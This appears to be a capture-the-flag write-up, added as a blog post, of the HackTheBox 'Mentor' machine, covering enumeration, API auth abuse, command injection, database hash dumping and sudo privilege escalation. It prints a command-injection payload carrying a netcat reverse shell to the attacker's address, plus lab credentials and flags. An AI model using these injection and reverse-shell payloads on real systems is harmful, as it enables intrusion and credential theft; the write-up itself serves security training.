@@ -1,0 +1,526 @@
+---
+title: Hackthebox Mentor Writeup
+slug: hackthebox-mentor-writeup
+description: Hackthebox released a new machine called mentor. On this machine, first we enumerate the new vhost which gives the api documentation that lists all the endpoints. Then there we get the command injection and get the rev shell, find the creads of database dump the hashes from the database and get the user password from snmp config files and for root we have the permission to execute the sh binary.
+date: 2022-12-11
+image: hackthebox-mentor-writeup.webp
+---
+
+import FixTheImageURL from '../../components/mdxComponents/FixTheImageURL.astro';
+import { components as MDXComponents } from '../../components/mdxComponents';
+export const components = MDXComponents;
+
+## Nmap
+
+```js
+❯ nmap -sC -sV -oA nmap/result 10.10.11.193
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-11 00:45 CST
+Nmap scan report for api.mentorquotes.htb (10.10.11.193)
+Host is up (0.089s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 c73bfc3cf9ceee8b4818d5d1af8ec2bb (ECDSA)
+|_  256 4440084c0ecbd4f18e7eeda85c68a4f7 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 81.68 seconds
+```
+
+Nmap tell us there are two ports open 22:ssh, `80:http` which is redirecting to `mentorquotes.htb`
+
+Let's add that in `/etc/hosts` file
+
+```js
+❯ cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       dedinfosec
+
+192.168.239.67    earth.local terratest.earth.local
+192.168.79.52     dc-9
+10.10.11.193      mentorquotes.htb
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+```
+
+## Port-80
+
+There is a `simple` web page, nothing much to do, I also try `dirbusting` but nothing found.
+
+<FixTheImageURL src='web.png' slug='hackthebox-mentor-writeup' />
+
+Let's try to `fuzz` the new subdomain with `wfuzz`
+
+```js
+❯ wfuzz -H "Host: FUZZ.mentorquotes.htb" --hc 302,400 -t 50 -H "User-Agent: DEDSEC" -c -z file,"/opt/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt" http://mentorquotes.htb/
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://mentorquotes.htb/
+Total requests: 38267
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000142:   404        0 L      2 W        22 Ch       "api"
+
+Total time: 0
+Processed Requests: 38267
+Filtered Requests: 38266
+Requests/sec.: 0
+```
+
+Found one, let's add that in `/etc/hosts` file
+
+```js
+❯ cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       dedinfosec
+
+192.168.239.67    earth.local terratest.earth.local
+192.168.79.52     dc-9
+10.10.11.193      api.mentorquotes.htb mentorquotes.htb
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+```
+
+## api.mentorquotes.htb
+
+There is `404` page, nothing much, let's try `dirbusting` to find some new endpoint.
+
+<FixTheImageURL src='web1.png' slug='hackthebox-mentor-writeup' />
+
+Found some `interesting endpoints` Let's go there one by one
+
+```js
+❯ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -u http://api.mentorquotes.htb/FUZZ -t 50
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.5.0 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://api.mentorquotes.htb/FUZZ
+ :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 50
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+________________________________________________
+
+admin                   [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 120ms]
+docs                    [Status: 200, Size: 969, Words: 194, Lines: 31, Duration: 103ms]
+users                   [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 95ms]
+quotes                  [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 89ms]
+server-status           [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 83ms]
+:: Progress: [38267/38267] :: Job [1/1] :: 399 req/sec :: Duration: [0:01:36] :: Errors: 0 ::
+```
+
+`/admin` Tell us we need to `authenticate` first to access this `endpoint`.
+
+<FixTheImageURL src='web2.png' slug='hackthebox-mentor-writeup' />
+
+`/docs` Tell us pretty much `everything` about every `endpoint` which is created on top of `swagger` module.
+
+<FixTheImageURL src='web3.png' slug='hackthebox-mentor-writeup' />
+
+And we also see that the owner of the website is `james` and his email is `james@mentorquotes.htb`
+
+<FixTheImageURL src='web4.png' slug='hackthebox-mentor-writeup' />
+
+Let's try to `sign up` with help of documentation, but I like working in `burp`, so I capture the request in `burp`.
+
+<FixTheImageURL src='web5.png' slug='hackthebox-mentor-writeup' />
+
+Created the `account` with random `creads`.
+
+<FixTheImageURL src='burp.png' slug='hackthebox-mentor-writeup' />
+
+Now, let's also `capture` the login endpoint request in `burp`.
+
+<FixTheImageURL src='web6.png' slug='hackthebox-mentor-writeup' />
+
+And we got the `JWT` token.
+
+<FixTheImageURL src='burp1.png' slug='hackthebox-mentor-writeup' />
+
+I also capture the request of `/users` endpoint in burp, which will give the all `users` list.
+
+<FixTheImageURL src='web7.png' slug='hackthebox-mentor-writeup' />
+
+But no `luck` this time, we got the `403` forbidden error which tell us that only `admin` can access this resource.
+
+<FixTheImageURL src='burp2.png' slug='hackthebox-mentor-writeup' />
+
+Let's `play` with the `/signup` endpoint.
+
+First I try to register with `james` user with his `email` which is `admin` of the website.
+
+But that's not working.
+
+<FixTheImageURL src='burp3.png' slug='hackthebox-mentor-writeup' />
+
+Now I change the email to that `email` which we `register` first time, and this time it's working.
+
+<Callout emoji='💡'>
+    It's mean that it's only validating the email that can't be registered more
+    than one time but this is not the same case with username.
+</Callout>
+
+<FixTheImageURL src='burp4.png' slug='hackthebox-mentor-writeup' />
+
+Now I try to `log in` with that same `creads` and we got the `JWT` token.
+
+<FixTheImageURL src='burp5.png' slug='hackthebox-mentor-writeup' />
+
+And this time we got the `users` list.
+
+<FixTheImageURL src='burp6.png' slug='hackthebox-mentor-writeup' />
+
+If you `remember` we found one endpoint called `/admin` which require authentication, let's try this `token` with that endpoint.
+
+And it's works we got `2` new `endpoints`
+
+-   /check
+-   /backup
+
+<FixTheImageURL src='burp7.png' slug='hackthebox-mentor-writeup' />
+
+The `/check` endpoint is not `implemented` yet.
+
+<FixTheImageURL src='burp8.png' slug='hackthebox-mentor-writeup' />
+
+But the `/backup` endpoint tell us that the `GET` method is not allowed.
+
+Let's `change` the method of request.
+
+<FixTheImageURL src='burp9.png' slug='hackthebox-mentor-writeup' />
+
+And it's tell us it's want `JSON` object with `body` attribute
+
+<FixTheImageURL src='burp10.png' slug='hackthebox-mentor-writeup' />
+
+I add the empty `JSON` object and change the content type to `application/json` which give one more attribute to specify called `path`.
+
+<FixTheImageURL src='burp11.png' slug='hackthebox-mentor-writeup' />
+
+When I give both `attribute` it gives success message called `Done!``
+
+<FixTheImageURL src='burp12.png' slug='hackthebox-mentor-writeup' />
+
+Let's try basic `command injection` with `ping` command, but first let's start the `tcpdump`.
+
+```js
+❯ sudo tcpdump -i tun0 icmp
+```
+
+And the `JSON` object look like this.
+
+Try a basic `technique` of command injection with `;`
+
+```json
+{
+    "body": "dedsec",
+    "path": "/etc/passwd;ping -c 2 10.10.XX.XX;"
+}
+```
+
+Let's send the `request` and check the `tcpdump`.
+
+<FixTheImageURL src='burp13.png' slug='hackthebox-mentor-writeup' />
+
+And we got the `ping` back
+
+<FixTheImageURL src='cmd.png' slug='hackthebox-mentor-writeup' />
+
+Let's try to get the `rev` shell.
+
+```json
+{
+    "body": "dedsec",
+    "path": "/etc/passwd;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.XX.XX 9001 >/tmp/f;"
+}
+```
+
+And we got the `rev` shell back.
+
+```js
+❯ nc -nvlp 9001
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.10.11.193.
+Ncat: Connection from 10.10.11.193:41189.
+sh: can't access tty; job control turned off
+/app # ls
+Dockerfile
+app
+requirements.txt
+/app # pwd
+/app
+/app # id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+```
+
+Inside the `/app/app` directory, I found `db.py` file, which has the `PostgreSQL` creads.
+
+```js
+/app # pwd
+/app
+/app # ls -al
+total 32
+drwxr-xr-x    1 root     root          4096 Nov 10 16:00 .
+drwxr-xr-x    1 root     root          4096 Nov 10 16:00 ..
+-rw-r--r--    1 root     root          1024 Jun 12 10:21 .Dockerfile.swp
+-rw-r--r--    1 root     root           522 Nov  3 12:58 Dockerfile
+drwxr-xr-x    1 root     root          4096 Nov 10 16:00 app
+-rw-r--r--    1 root     root           672 Jun  4  2022 requirements.txt
+/app # cd app
+/app/app # ls -al
+total 40
+drwxr-xr-x    1 root     root          4096 Nov 10 16:00 .
+drwxr-xr-x    1 root     root          4096 Nov 10 16:00 ..
+-rw-r--r--    1 root     root             0 Jun  4  2022 __init__.py
+drwxr-xr-x    1 root     root          4096 Nov 10 16:00 __pycache__
+drwxr-xr-x    1 root     root          4096 Nov 10 16:00 api
+-rw-r--r--    1 root     root             0 Jun  4  2022 config.py
+-rw-r--r--    1 root     root          1001 Jun  7  2022 db.py
+-rw-r--r--    1 root     root          1149 Jun  4  2022 main.py
+-rw-r--r--    1 root     root           704 Jun  4  2022 requirements.txt
+```
+
+```python {8}:db.py
+import os
+
+from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData)
+from sqlalchemy.sql import func
+from databases import Database
+
+# Database url if none is passed the default one is used
+DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")
+
+# SQLAlchemy for quotes
+engine = create_engine(DATABASE_URL)
+metadata = MetaData()
+quotes = Table(
+    "quotes",
+    metadata,
+    Column("id", Integer, primary_key=True),
+    Column("title", String(50)),
+    Column("description", String(50)),
+    Column("created_date", DateTime, default=func.now(), nullable=False)
+)
+
+# SQLAlchemy for users
+engine = create_engine(DATABASE_URL)
+metadata = MetaData()
+users = Table(
+    "users",
+    metadata,
+    Column("id", Integer, primary_key=True),
+    Column("email", String(50)),
+    Column("username", String(50)),
+    Column("password", String(128) ,nullable=False)
+)
+
+
+# Databases query builder
+database = Database(DATABASE_URL)
+```
+
+For interacting with `PostgreSQL` database, we need to forward the port with `chisel`
+
+Let's transfer the `chisel` binary.
+
+<FixTheImageURL src='cmd1.png' slug='hackthebox-mentor-writeup' />
+
+Let's start the `chisel` server on our `kali` box.
+
+```js
+chmod +x chisel
+sudo ./chisel server --port 9002 --reverse
+```
+
+Now let's connect the `client` with server on port `9002` which give access to `5432` port which is default port of `PostgreSQL` database.
+
+```js
+chmod +x chisel
+./chisel client -v 10.10.XX.XX:9002 R:5432:172.22.0.1:5432
+```
+
+<FixTheImageURL src='cmd2.png' slug='hackthebox-mentor-writeup' />
+
+Let's connect the `PostgreSQL` database.
+
+And we got the three `hashes`, one of the hashes is ours.
+
+```js
+❯ psql -h 10.10.XX.XX -U "postgres" -p 5432
+Password for user postgres:
+psql (14.5 (Debian 14.5-2), server 13.7 (Debian 13.7-1.pgdg110+1))
+Type "help" for help.
+
+postgres=# \list
+                                    List of databases
+      Name       |  Owner   | Encoding |  Collate   |   Ctype    |   Access privileges
+-----------------+----------+----------+------------+------------+-----------------------
+ mentorquotes_db | postgres | UTF8     | en_US.utf8 | en_US.utf8 |
+ postgres        | postgres | UTF8     | en_US.utf8 | en_US.utf8 |
+ template0       | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +
+                 |          |          |            |            | postgres=CTc/postgres
+ template1       | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +
+                 |          |          |            |            | postgres=CTc/postgres
+(4 rows)
+
+postgres=# \c mentorquotes_db
+psql (14.5 (Debian 14.5-2), server 13.7 (Debian 13.7-1.pgdg110+1))
+You are now connected to database "mentorquotes_db" as user "postgres".
+mentorquotes_db=# \d
+              List of relations
+ Schema |     Name      |   Type   |  Owner
+--------+---------------+----------+----------
+ public | cmd_exec      | table    | postgres
+ public | quotes        | table    | postgres
+ public | quotes_id_seq | sequence | postgres
+ public | users         | table    | postgres
+ public | users_id_seq  | sequence | postgres
+(5 rows)
+
+mentorquotes_db=# select * from users;
+ id |          email          |  username   |             password
+----+-------------------------+-------------+----------------------------------
+  1 | james@mentorquotes.htb  | james       | 7ccdcd8c05b59add9c198d492b36a503
+  2 | svc@mentorquotes.htb    | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
+  4 | dedsec@mentorquotes.htb | james       | fc8767a5e9e2382a17072b10725e1c8b
+(3 rows)
+```
+
+Crack the hash with `crackstation` and we got the `svc` user password called `123meunomeeivani`
+
+<FixTheImageURL src='web8.png' slug='hackthebox-mentor-writeup' />
+
+And we got the `user.txt` file.
+
+```js
+❯ ssh svc@10.10.11.193
+The authenticity of host '10.10.11.193 (10.10.11.193)' can't be established.
+ED25519 key fingerprint is SHA256:fkqwgXFJ5spB0IsQCmw4K5HTzEPyM27mczyMp6Qct5Q.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.193' (ED25519) to the list of known hosts.
+svc@10.10.11.193's password:
+Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-56-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun Dec 11 09:41:28 AM UTC 2022
+
+  System load:                      0.0
+  Usage of /:                       64.9% of 8.09GB
+  Memory usage:                     14%
+  Swap usage:                       0%
+  Processes:                        240
+  Users logged in:                  0
+  IPv4 address for br-028c7a43f929: 172.20.0.1
+  IPv4 address for br-24ddaa1f3b47: 172.19.0.1
+  IPv4 address for br-3d63c18e314d: 172.21.0.1
+  IPv4 address for br-7d5c72654da7: 172.22.0.1
+  IPv4 address for br-a8a89c3bf6ff: 172.18.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for eth0:            10.10.11.193
+  IPv6 address for eth0:            dead:beef::250:56ff:feb9:5da8
+
+  => There are 3 zombie processes.
+
+
+0 updates can be applied immediately.
+
+
+Last login: Mon Dec  5 14:30:48 2022 from 10.10.14.40
+svc@mentor:~$ cat user.txt
+59c8a0c830dd00c74ff2c9bf334240a6
+```
+
+## Privilege Escalation
+
+Running the `linPEAS` and we got the `SNMP` config file.
+
+And we also see that it's `created` recently.
+
+<FixTheImageURL src='cmd3.png' slug='hackthebox-mentor-writeup' />
+
+And we also see that `SNMP` default port is open
+
+```js
+❯ sudo nmap -sU -p 161 10.10.11.193
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-11 04:04 CST
+Nmap scan report for api.mentorquotes.htb (10.10.11.193)
+Host is up (0.086s latency).
+
+PORT    STATE SERVICE
+161/udp open  snmp
+
+Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds
+```
+
+Checking the `snmpd.conf` we got a password `SuperSecurePassword123__`
+
+```js
+svc@mentor:/tmp$ cat /etc/snmp/snmpd.conf
+....
+createUser bootstrap MD5 SuperSecurePassword123__ DES
+rouser bootstrap priv
+....
+```
+
+Try that `password` with `james` user and it's works.
+
+```js
+svc@mentor:~$ su james
+Password:
+james@mentor:/home/svc$ id
+uid=1000(james) gid=1000(james) groups=1000(james)
+```
+
+Checking the `user` if they have `sudo privilege`
+
+```js
+james@mentor:~$ sudo -l
+[sudo] password for james:
+Matching Defaults entries for james on mentor:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User james may run the following commands on mentor:
+    (ALL) /bin/sh
+```
+
+And we see it's run the `/bin/sh` binary with `root` privilege.
+
+And we got the `root.txt` file
+
+```js
+james@mentor:~$ sudo /bin/sh
+# cd ~
+# cat root.txt
+74eb907c989f21c3b35798fcca58a2b9
+```
